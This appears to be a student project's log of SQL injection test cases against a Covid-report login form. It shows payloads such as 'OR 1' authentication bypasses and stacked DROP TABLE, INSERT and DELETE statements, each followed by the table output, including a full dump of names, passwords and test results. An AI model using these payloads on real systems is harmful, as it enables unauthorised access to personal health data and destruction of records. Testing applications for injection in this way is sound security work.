@@ -1,0 +1,89 @@
+1st test case:
+Enter Test No.
+10000001 OR 1;
+Enter Password
+anything
+Name	Test_No	Password	Covid_Report
+Aadish Jain	10000001	@10000001@	NO
+Anvi Sharma	10000002	@10000002@	NO
+Aman Singh	10000003	@10000003@	YES
+Ankur Shrivastav	10000004	@10000004@	YES
+Anshul Gupta	10000005	@10000005@	NO
+Ashwin Khatri	10000006	@10000006@	NO
+Devesh Meena	10000007	@10000007@	YES
+Divya Sharma	10000008	@10000008@	NO
+Harshita Sharma	10000009	@10000009@	NO
+Kunika Kabra	10000010	@10000010@	NO
+Mansi Hada	10000011	@10000011@	YES
+Misba Zamil	10000012	@10000012@	NO
+Modit Meena	10000013	@10000013@	YES
+Neeraj Rajput	10000014	@10000014@	YES
+Neha Meena	10000015	@10000015@	NO
+Nikita Suman	10000016	@10000016@	YES
+Payal Jagwani	10000017	@10000017@	YES
+Piyush Mathur	10000018	@10000018@	YES
+Pragya Sharma	10000019	@10000019@	NO
+Pratyush Jahangir	10000020	@10000020@	NO
+Rashi Chaudhary	10000021	@10000021@	NO
+Rishika Trivedi	10000022	@10000022@	YES
+Shruti Mishra	10000023	@10000023@	YES
+Sumit Nagar	10000024	@10000024@	NO
+Vishal Rajput	10000025	@10000025@	NO
+
+2nd test case:
+Enter Test No.
+10000001; DROP TABLE USERS;
+Enter Password
+anything
+Name	Test_No	Password	Covid_Report
+Aadish Jain	10000001	@10000001@	NO
+
+3rd test case:
+Enter Test No.
+10000001; INSERT INTO Covid_Report VALUES('Lipi',10000026,'@10000026@','NO');
+Enter Password
+anything
+Name	Test_No	Password	Covid_Report
+Aadish Jain	10000001	@10000001@	NO
+
+4th test case:
+Enter Test No.
+10000001
+Enter Password
+anything' OR 1;
+Name	Test_No	Password	Covid_Report
+Aadish Jain	10000001	@10000001@	NO
+Anvi Sharma	10000002	@10000002@	NO
+Aman Singh	10000003	@10000003@	YES
+Ankur Shrivastav	10000004	@10000004@	YES
+Anshul Gupta	10000005	@10000005@	NO
+Ashwin Khatri	10000006	@10000006@	NO
+Devesh Meena	10000007	@10000007@	YES
+Divya Sharma	10000008	@10000008@	NO
+Harshita Sharma	10000009	@10000009@	NO
+Kunika Kabra	10000010	@10000010@	NO
+Mansi Hada	10000011	@10000011@	YES
+Misba Zamil	10000012	@10000012@	NO
+Modit Meena	10000013	@10000013@	YES
+Neeraj Rajput	10000014	@10000014@	YES
+Neha Meena	10000015	@10000015@	NO
+Nikita Suman	10000016	@10000016@	YES
+Payal Jagwani	10000017	@10000017@	YES
+Piyush Mathur	10000018	@10000018@	YES
+Pragya Sharma	10000019	@10000019@	NO
+Pratyush Jahangir	10000020	@10000020@	NO
+Rashi Chaudhary	10000021	@10000021@	NO
+Rishika Trivedi	10000022	@10000022@	YES
+Shruti Mishra	10000023	@10000023@	YES
+Sumit Nagar	10000024	@10000024@	NO
+Vishal Rajput	10000025	@10000025@	NO
+Lipi	10000026	@10000026@	NO
+
+5th test case:
+Enter Test No.
+10000001; DELETE FROM Covid_Report WHERE Test_No=10000026;
+Enter Password
+anything
+Name	Test_No	Password	Covid_Report
+Aadish Jain	10000001	@10000001@	NO
+
